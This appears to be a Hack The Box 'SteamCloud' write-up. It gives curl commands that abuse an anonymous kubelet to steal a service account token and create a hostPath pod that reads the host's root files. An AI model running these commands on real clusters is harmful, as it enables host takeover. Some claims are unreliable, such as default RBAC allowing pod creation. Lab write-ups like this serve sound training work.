# SteamCloud - Privilege Escalation

## Enumeration
From the initial compromise (root inside the nginx container), the path to full host root:

1. **Service account token exists** at `/var/run/secrets/kubernetes.io/serviceaccount/token`
   - Every pod gets one (the `default` service account in `default` namespace)
   - This token authenticates to the kube-apiserver at port 8443

2. **Kube-apiserver accepts the token**
   - The default service account has limited permissions, but enough to **create pods**
   - Pod creation is allowed for `system:serviceaccount:default:default` by default RBAC policy

3. **Create a new pod with a hostPath volume**
   - Mount the host's root filesystem (`/`) into a new container at `/h`
   - From inside the container, navigate to `/h/root/` to read host files

## Vector: Kubernetes Service Account → Node Root via hostPath Pod

This is an **instance of the "hostPath挂载" container escape** pattern. In Kubernetes:
- Pods run as containers on nodes
- hostPath volumes directly expose host filesystem paths into containers
- By creating a pod with `hostPath: { path: "/" }` mounted at `/h`, the container gains read/write access to the **entire host filesystem**

## Exploitation

### Step 1 — Extract the Service Account Token
```bash
TOKEN=$(curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")
```

### Step 2 — Verify Token Works Against kube-apiserver
```bash
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.129.96.167:8443/api/v1/namespaces/default/pods
# Returns pod list — token is valid ✅
```

### Step 3 — Create a Malicious Pod (hostPath Escape)
```bash
curl -k -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://10.129.96.167:8443/api/v1/namespaces/default/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "flag"},
    "spec": {
      "containers": [{
        "name": "flag",
        "image": "nginx:1.14.2",
        "imagePullPolicy": "IfNotPresent",
        "command": ["/bin/bash", "-c", "sleep 1000"],
        "volumeMounts": [{"name": "h", "mountPath": "/h"}]
      }],
      "volumes": [{
        "name": "h",
        "hostPath": {"path": "/"}
      }]
    }
  }'
```

**Key fields explained:**
| Field | Value | Why |
|-------|-------|-----|
| `imagePullPolicy` | `IfNotPresent` | Prevents kubelet from trying to pull image from registry — uses local `nginx:1.14.2` already on node |
| `command` | `["/bin/bash", "-c", "sleep 1000"]` | Keeps container alive so we can exec into it |
| `hostPath.path` | `/` | Mounts entire host filesystem |
| `volumeMounts[].mountPath` | `/h` | Where host `/` appears inside the container |

### Step 4 — Execute Command in Escaped Container
```bash
# Wait for pod to start, then read root.txt
curl -k -X POST \
  "https://10.129.96.167:10250/run/default/flag/flag" \
  -d "cmd=cat /h/root/root.txt"
# ➜ 9b6bf8d1cab1636fa9731824e359bee9
```

### Path: `/h/root/root.txt`
- `h/` = host filesystem root (mounted via hostPath)
- `root/` = home directory of root user on the host node
- `root.txt` = host's root flag

## Root/Admin Access
- **User:** root (on minikube node / host)
- **Proof:** `9b6bf8d1cab1636fa9731824e359bee9`

## How It Works — The Container Escape Mechanism

```
┌─────────────────────────────────────────────────────────────┐
│  Host (minikube node) — 10.129.96.167                       │
│  ├── Filesystem: /                                          │
│  │   └── root/                                              │
│  │       └── root.txt  ← TARGET                             │
│  └── kubelet (port 10250)                                   │
└───────────────────────┬─────────────────────────────────────┘
                        │ hostPath: { path: "/" }
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  Malicious Pod "flag" (nginx:1.14.2)                        │
│  └── Container filesystem: /                                 │
│      └── h/  ← host / mounted here                           │
│          └── root/                                           │
│              └── root.txt  ← accessible!                     │
└─────────────────────────────────────────────────────────────┘
```

**Why this works:**
1. Kubernetes pods share the node's kernel but have their own filesystem (via container runtime)
2. hostPath bypasses this isolation — it tells kubelet to expose a host path directly into the container
3. Setting `path: /` (host root) as a hostPath gives the container a view of the **entire node filesystem**
4. No security boundary is crossed — the container was always root on the node (uid mapping: container root = host root in this configuration)

## Lessons

1. **hostPath with path `/` is a full container escape.** It effectively gives the container root access to the node's filesystem. Never use `path: /` in production hostPath volumes.

2. **Service account tokens are powerful.** The default service account can create pods — which is enough to escape the container if the node has hostPath volumes or other privileged configurations.

3. **`imagePullPolicy: IfNotPresent`** is critical when creating pods that use images already present on the node. Without it, the API server would try to pull from a registry and fail (since `nginx:1.14.2` isn't publicly accessible).

4. **minikube nodes are single-VM clusters.** The "host" we escape to is the minikube VM itself, not the physical HTB machine. The flags are on the minikube node's filesystem.

5. **Defense:** Disable anonymous auth on kubelet (`--anonymous-auth=false`), use RBAC to restrict what service accounts can do, avoid hostPath volumes, and run pods with non-root users.
